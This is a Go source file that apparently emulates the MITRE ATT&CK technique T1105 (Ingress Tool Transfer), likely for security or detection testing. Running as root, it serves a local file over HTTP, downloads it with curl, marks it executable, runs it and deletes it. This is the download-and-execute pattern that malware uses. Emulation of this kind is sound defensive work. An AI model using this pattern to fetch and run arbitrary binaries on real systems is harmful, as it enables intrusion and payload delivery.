package main

import (
	"fmt"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"script/pkg/system"
	"script/pkg/tags"
)

var (
	port     = "54340"
	fileName = "myapp"
)

func main() {
	ip := system.GetOutboundIP()
	url := fmt.Sprintf("http://%s:%s/payload", ip, port)

	if !system.IsRoot() {
		fmt.Printf("%sThe script must be run using root permissions\n", tags.Err)
		return
	}

	fmt.Printf("%sT1105 Ingress Tool Transfer\n", tags.Info)

	go startWebServer(port, fileName)

	err := getRequestToRetrieveFile(url, fileName)
	if err != nil {
		fmt.Printf("%sError on GET request for %s: %s\n", tags.Err, url, err.Error())
		return
	}
	defer deleteFile(fileName)

	makeFileExecutable(fileName)

	err = launchFile(fileName)
	if err != nil {
		fmt.Printf("%sError when running the received file %s: %s\n", tags.Err, fileName, err.Error())
	}
}

func startWebServer(port, fileName string) error {
	filePath := filepath.Join("assets", fileName)
	http.HandleFunc("/payload", payloadHandler(filePath))

	fmt.Printf("%sServer is running at http://localhost:%s\n", tags.Log, port)
	return http.ListenAndServe(":"+port, nil)
}

func payloadHandler(filePath string) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		file, err := os.Open(filePath)
		if err != nil {
			http.Error(w, "File not found\n", http.StatusNotFound)
			fmt.Printf("%sError opening file %s: %s\n", tags.Err, filePath, err)
			return
		}
		defer file.Close()

		w.Header().Set("Content-Disposition", "attachment; filename=\"myapp\"")
		w.Header().Set("Content-Type", "application/octet-stream")
		http.ServeFile(w, r, filePath)
	}
}

func getRequestToRetrieveFile(url string, fileName string) error {
	err := exec.Command("curl", "-X", "GET", url, "-o", fileName).Run()
	if err != nil {
		return err
	}

	return nil
}

func makeFileExecutable(filePath string) {
	err := exec.Command("chmod", "+x", filePath).Run()
	if err != nil {
		fmt.Printf("%sError when changing access rights for %s: %s\n", tags.Log, filePath, err.Error())
	}
}

func launchFile(filePath string) error {
	out, err := exec.Command("./" + filePath).Output()
	if err != nil {
		return err
	}
	fmt.Printf("%sThe %s file is running\n", tags.Log, fileName)
	fmt.Print(string(out))
	return nil
}

func deleteFile(filePath string) {
	err := os.Remove(fileName)
	if err != nil {
		fmt.Printf("%sError when deleting file %s: %s\n", tags.Err, filePath, err.Error())
	} else {
		fmt.Printf("%sFile %s deleted\n", tags.Info, fileName)
	}
}
